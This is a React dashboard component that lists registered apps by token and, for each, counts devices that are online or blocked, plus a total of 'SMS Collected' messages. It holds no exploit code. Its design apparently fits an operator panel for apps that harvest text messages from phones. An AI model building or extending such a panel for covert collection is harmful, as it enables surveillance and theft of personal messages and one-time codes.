import { useEffect, useState } from "react";
import { Boxes, Smartphone, ShieldOff, MessageSquare, RefreshCw, TrendingUp } from "lucide-react";
import StatCard from "@/components/StatCard";
import Badge from "@/components/Badge";
import type { AdminApp, Device } from "@/lib/types";
import { getApps, getDevices, calcStats } from "@/lib/supabase";

export default function Dashboard() {
  const [apps, setApps] = useState<AdminApp[]>([]);
  const [deviceMap, setDeviceMap] = useState<Record<string, Device[]>>({});
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);

  const load = async (silent = false) => {
    if (!silent) setLoading(true); else setRefreshing(true);
    try {
      const loaded = await getApps();
      setApps(loaded);
      const map: Record<string, Device[]> = {};
      await Promise.allSettled(
        loaded.map(async (a) => {
          try { map[a.token] = await getDevices(a.token); } catch { map[a.token] = []; }
        })
      );
      setDeviceMap(map);
    } finally {
      setLoading(false); setRefreshing(false);
    }
  };

  useEffect(() => { load(); }, []);

  const totalApps  = apps.length;
  const activeApps = apps.filter((a) => a.is_active).length;
  const allDevices = Object.values(deviceMap).flat();
  const totalDev   = allDevices.length;
  const blockedDev = allDevices.filter((d) => d.status === "blocked").length;
  const totalSms   = allDevices.reduce((s, d) => s + (d.total_sms_count ?? 0), 0);
  const now        = Date.now();
  const onlineDev  = allDevices.filter((d) => {
    const t = d.data_json?.online_checked_at ?? 0;
    return t > 0 && now - t < 15 * 60 * 1000;
  }).length;

  return (
    <div className="flex-1 overflow-auto bg-[#080c16]">
      <div className="sticky top-0 z-10 bg-[#080c16]/90 backdrop-blur border-b border-slate-800/60 h-14 flex items-center justify-between px-6">
        <div>
          <h1 className="text-sm font-semibold text-white">Dashboard</h1>
          <p className="text-xs text-slate-600">Overview of all applications</p>
        </div>
        <button onClick={() => load(true)} disabled={refreshing}
                className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs text-slate-400 hover:text-white transition-colors disabled:opacity-50">
          <RefreshCw className={`w-3 h-3 ${refreshing ? "animate-spin" : ""}`} />
          Refresh
        </button>
      </div>

      <div className="p-6 space-y-6">
        {loading ? (
          <div className="flex items-center justify-center py-24 text-slate-600">
            <span className="w-5 h-5 border-2 border-slate-700 border-t-blue-500 rounded-full animate-spin mr-2" />
            <span className="text-sm">Load ho raha hai…</span>
          </div>
        ) : (
          <>
            <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
              <StatCard label="Total Apps"      value={totalApps}                  icon={Boxes}          color="blue"  sub={`${activeApps} active`} />
              <StatCard label="Total Devices"   value={totalDev}                   icon={Smartphone}     color="green" sub={`${onlineDev} online now`} />
              <StatCard label="Blocked Devices" value={blockedDev}                 icon={ShieldOff}      color="red"   sub="across all apps" />
              <StatCard label="SMS Collected"   value={totalSms.toLocaleString()} icon={MessageSquare}  color="amber" sub="total messages" />
            </div>

            <div>
              <h2 className="text-sm font-semibold text-white flex items-center gap-2 mb-3">
                <TrendingUp className="w-4 h-4 text-blue-400" />
                All Applications
              </h2>

              {apps.length === 0 ? (
                <div className="text-center py-16 bg-[#0d1220] border border-slate-800 rounded-2xl">
                  <Boxes className="w-8 h-8 mx-auto text-slate-700 mb-3" />
                  <p className="text-sm text-slate-600">Koi app nahi. "Applications" mein naya banao.</p>
                </div>
              ) : (
                <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-3">
                  {apps.map((app) => {
                    const devs = deviceMap[app.token] ?? [];
                    const st   = calcStats(devs);
                    return (
                      <div key={app.id}
                           className="bg-[#0d1220] border border-slate-800/80 rounded-2xl p-4">
                        <div className="flex items-start justify-between mb-3">
                          <div className="flex-1 min-w-0">
                            <p className="font-semibold text-white text-sm truncate">{app.label || app.token}</p>
                            <p className="font-mono text-xs text-slate-500 mt-0.5">{app.token}</p>
                          </div>
                          <Badge variant={app.is_active ? "active" : "inactive"} />
                        </div>
                        <div className="grid grid-cols-3 gap-2">
                          {[
                            { l: "Devices", v: st.total,   c: "text-white" },
                            { l: "Online",  v: st.online,  c: "text-emerald-400" },
                            { l: "Blocked", v: st.blocked, c: "text-red-400" },
                          ].map(({ l, v, c }) => (
                            <div key={l} className="bg-[#080c16] rounded-xl p-2.5 text-center">
                              <p className={`text-lg font-bold tabular-nums ${c}`}>{v}</p>
                              <p className="text-[10px] text-slate-600 mt-0.5">{l}</p>
                            </div>
                          ))}
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          </>
        )}
      </div>
    </div>
  );
}
